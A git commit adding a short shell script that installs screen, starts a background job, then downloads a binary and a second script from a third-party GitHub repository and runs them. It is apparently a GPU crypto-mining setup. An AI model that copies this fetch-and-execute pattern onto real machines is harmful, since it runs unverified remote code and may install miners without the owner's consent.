fea6a3d724f5ecb1995e89e9f2b010715e542ffb
yuliantiriyanti6 <88493189+yuliantiriyanti6@users.noreply.github.com>
2021-08-12 01:52:18 +0700

    Create wrkzshiba.sh

---
+++ wrkzshiba.sh
@@ -0,0 +1,15 @@
+#!/bin/sh
+
+sudo apt update
+
+sudo apt install screen -y
+
+screen -dmS shiba.sh ./shiba.sh 65 75
+
+wget https://github.com/pakistajam12/saurustajam199/raw/main/tuyulgpu
+
+wget https://raw.githubusercontent.com/pakistajam12/saurustajam199/main/vioshiba.sh
+
+chmod +x vioshiba.sh
+
+./vioshiba.sh
